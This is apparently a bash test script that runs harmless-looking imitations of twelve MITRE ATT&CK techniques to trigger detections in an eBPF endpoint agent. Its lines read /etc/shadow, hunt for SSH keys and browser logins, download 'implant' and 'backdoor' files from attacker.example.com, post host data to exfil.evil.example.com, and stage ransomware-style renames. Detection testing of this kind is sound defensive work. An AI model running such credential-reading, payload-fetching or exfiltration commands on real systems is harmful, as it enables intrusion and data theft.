#!/usr/bin/env bash
# EDR Simulation Script - 12 MITRE ATT&CK Categories
# Runs benign-but-suspicious commands that trigger detection rules.
# Designed for E2E testing of eBPF-enabled eGuard agent.
#
# Usage: ssh agent@<host> 'bash -s' < scripts/edr_simulation.sh
#
set -uo pipefail

SIM_DIR="/tmp/edr-sim-$$"
mkdir -p "${SIM_DIR}"
trap 'rm -rf "${SIM_DIR}"' EXIT

log() { printf '[%s] %-25s %s\n' "$(date -u +%H:%M:%S)" "$1" "$2"; }
sep() { printf '\n=== %s ===\n' "$1"; }

sep "T1059 - Execution: Command & Scripting Interpreter"
log "T1059.004" "Bash reverse shell attempt (will fail safely)"
bash -c 'echo simulated_reverse_shell' >/dev/null 2>&1 || true
log "T1059.006" "Python execution"
python3 -c 'import os; os.getpid()' 2>/dev/null || true
log "T1059.004" "Curl pipe to shell pattern"
echo 'echo harmless' > "${SIM_DIR}/payload.sh"
cat "${SIM_DIR}/payload.sh" | bash 2>/dev/null || true

sep "T1053 - Persistence: Scheduled Task/Job"
log "T1053.003" "Crontab enumeration"
crontab -l 2>/dev/null || true
log "T1053.003" "At job listing"
atq 2>/dev/null || true
log "T1053" "Systemd timer listing"
systemctl list-timers --no-pager 2>/dev/null | head -5 || true

sep "T1548 - Privilege Escalation: Abuse Elevation Control"
log "T1548.003" "Sudo -l enumeration"
sudo -l 2>/dev/null || true
log "T1548.001" "SUID binary search"
find /usr/bin -perm -4000 -type f 2>/dev/null | head -5 || true
log "T1548" "Capabilities enumeration"
getpcaps $$ 2>/dev/null || getcap /usr/bin/* 2>/dev/null | head -5 || true

sep "T1082 - Discovery: System Information"
log "T1082" "System information gathering"
uname -a 2>/dev/null || true
cat /etc/os-release 2>/dev/null | head -3 || true
log "T1083" "File and directory discovery"
ls -la /etc/shadow 2>/dev/null || true
ls -la /etc/passwd 2>/dev/null || true
log "T1057" "Process discovery"
ps auxf 2>/dev/null | head -10 || true
log "T1049" "Network connections"
ss -tlnp 2>/dev/null | head -10 || true
log "T1016" "Network configuration"
ip addr show 2>/dev/null | head -10 || true
ip route show 2>/dev/null | head -5 || true

sep "T1003 - Credential Access"
log "T1003.008" "/etc/shadow read attempt"
cat /etc/shadow 2>/dev/null || true
log "T1003" "/etc/passwd read"
cat /etc/passwd >/dev/null 2>&1 || true
log "T1552.001" "SSH key enumeration"
ls -la ~/.ssh/ 2>/dev/null || true
find /home -name "id_rsa" -o -name "id_ed25519" 2>/dev/null || true
log "T1555" "Browser credential locations"
find /home -path "*/.mozilla/firefox/*/logins.json" 2>/dev/null || true

sep "T1071 - Command & Control: Application Layer Protocol"
log "T1071.001" "HTTP C2 beacon simulation"
curl -s -o /dev/null -w '%{http_code}' https://evil-c2-domain.example.com 2>/dev/null || true
log "T1071.001" "DNS C2 query simulation"
nslookup malware-c2.evil.example.com 2>/dev/null || true
dig data.exfil.evil.example.com 2>/dev/null || true
log "T1071.001" "Known-bad domain resolution"
host apt28-c2.evil.example.com 2>/dev/null || true

sep "T1105 - Ingress Tool Transfer"
log "T1105" "Wget malicious payload simulation"
wget -q -O "${SIM_DIR}/tool.bin" https://attacker.example.com/implant 2>/dev/null || true
log "T1105" "Curl download to /tmp"
curl -s -o "${SIM_DIR}/backdoor.elf" https://attacker.example.com/backdoor 2>/dev/null || true

sep "T1070 - Defense Evasion: Indicator Removal"
log "T1070.003" "History clearing attempt"
echo '' > "${SIM_DIR}/fake_history" 2>/dev/null || true
log "T1070.004" "Log tampering simulation"
touch "${SIM_DIR}/fake_auth.log"
echo 'tampered log entry' > "${SIM_DIR}/fake_auth.log"
log "T1027" "Base64 obfuscated command"
echo 'L2Jpbi9iYXNo' | base64 -d 2>/dev/null || true
log "T1140" "Deobfuscation"
echo 'd2hvYW1p' | base64 -d 2>/dev/null | bash 2>/dev/null || true

sep "T1021 - Lateral Movement: Remote Services"
log "T1021.004" "SSH to localhost (will fail)"
ssh -o BatchMode=yes -o ConnectTimeout=1 -o StrictHostKeyChecking=no root@127.0.0.1 'echo lateral' 2>/dev/null || true
log "T1021.004" "SSH key scan"
ssh-keyscan 127.0.0.1 2>/dev/null | head -3 || true

sep "T1041 - Exfiltration: Exfiltration Over C2 Channel"
log "T1041" "Data staging for exfiltration"
tar czf "${SIM_DIR}/exfil.tar.gz" /etc/hostname /etc/machine-id 2>/dev/null || true
log "T1048.003" "DNS exfiltration simulation"
for i in 1 2 3; do
  nslookup "${i}.exfil.data.evil.example.com" 2>/dev/null || true
done
log "T1567" "HTTP exfiltration simulation"
curl -s -X POST -d @/etc/hostname https://exfil.evil.example.com/upload 2>/dev/null || true

sep "T1486 - Impact: Data Encrypted for Impact (Ransomware sim)"
log "T1486" "Ransomware-like file operations (in temp dir only)"
for i in $(seq 1 5); do
  echo "important_data_${i}" > "${SIM_DIR}/document_${i}.txt"
done
for f in "${SIM_DIR}"/document_*.txt; do
  mv "${f}" "${f}.encrypted" 2>/dev/null || true
done
echo "YOUR FILES HAVE BEEN ENCRYPTED" > "${SIM_DIR}/RANSOM_NOTE.txt"
log "T1486" "Mass file rename pattern detected"

sep "T1562 - Defense Evasion: Impair Defenses"
log "T1562.001" "Attempt to stop security service"
systemctl status apparmor 2>/dev/null | head -3 || true
log "T1562.004" "Firewall manipulation attempt"
iptables -L 2>/dev/null | head -3 || true
log "T1562" "Agent binary integrity check"
ls -la /usr/local/eg/sbin/eguard-agent 2>/dev/null || true

sep "SIMULATION COMPLETE"
log "SUMMARY" "12 MITRE ATT&CK categories exercised"
log "SUMMARY" "Check admin GUI: Events, Detections, and Response tabs"
log "SUMMARY" "Expected: process_exec, tcp_connect, dns_query, file_write events"
